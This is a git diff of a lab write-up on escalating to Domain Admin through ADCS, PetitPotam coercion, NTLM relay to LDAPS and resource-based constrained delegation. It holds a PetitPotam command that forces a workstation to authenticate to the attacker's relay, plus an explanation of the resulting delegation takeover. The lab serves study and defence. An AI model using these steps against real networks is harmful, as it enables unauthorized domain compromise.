@@ -2,9 +2,11 @@
 
 This is a quick lab to familiarize with an Active Directory Certificate Services \(ADCS\) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured \(which it is by default\), to effectively escalate privileges from a low privileged domain user to Domain Admin.
 
+The ADCS vulnerabilities were researched by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) in [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [PetitPotam](https://github.com/topotam/PetitPotam) was researched by [Gilles Lionel @topotam77](https://twitter.com/topotam77).
+
 ## Conditions
 
-Below are listed the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:
+Below are listed some conditions making an AD environment vulnerable to ADCS + NTLM relay attack:
 
 * ADCS is configured to allow NTLM authentication;
 * NTLM authentication is not protected by EPA or SMB signing;
@@ -176,7 +178,7 @@ Notes about RBCD takeover:
 
 ### Forcing WS01 to Authenticate to NTLM Relay
 
-On computer `CA01`, let's invoke PetitPotam and coerce `WS01` \(10.0.0.7\) to authenticate to our Kali box where our NTLM relay is setup:
+On computer `CA01`, let's invoke PetitPotam and coerce `WS01` \(10.0.0.7\) to authenticate to our Kali box \(10.0.0.5\) where our NTLM relay is setup:
 
 ```text
 .\PetitPotam.exe kali@80/spotless.txt 10.0.0.7
@@ -184,13 +186,19 @@ On computer `CA01`, let's invoke PetitPotam and coerce `WS01` \(10.0.0.7\) to au
 
 ![](../../.gitbook/assets/image%20%281043%29.png)
 
-On our Kali box, we can see the the incoming authentication from `WS01$` was relayed to `ldaps://dc01` and that a new computer `quaiivve$` account \(that `WS01` now trusts and allows to impersonate any domain user\):
+On our Kali box, we can see the the incoming authentication from `WS01$` was relayed to `ldaps://dc01` and that a new computer `quaiivve$` account \(that `WS01` now trusts and allows to impersonate any domain user\), was created:
 
 ![LDAP relay succeeds, delegation rights setup](../../.gitbook/assets/image%20%281048%29.png)
 
 Below is just a quick screenshot showing that the `QUAIIVEE` computer account has been indeed created and `WS01$` has some privileges:
 
 ![Computer AD object created as part of RBCD attack](../../.gitbook/assets/image%20%281042%29.png)
+
+Additionally, we can see that the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on computer object `WS01` has now some binary value, which is empty by default on computer objects:
+
+![WS01 has been configured for RBCD attack](../../.gitbook/assets/image%20%281064%29.png)
+
+From [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md#modifying-target-computers-ad-object), we know that the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, after we've successfully performed the LDAP relay attack, effectively means the following: computer `WS01` suddenly trust the computer account `QUAIIVVE$` and allows it to impersonate any domain user, including Domain Admins and grant them administrative access to `WS01`.
 
 ### Calculating Hash
 
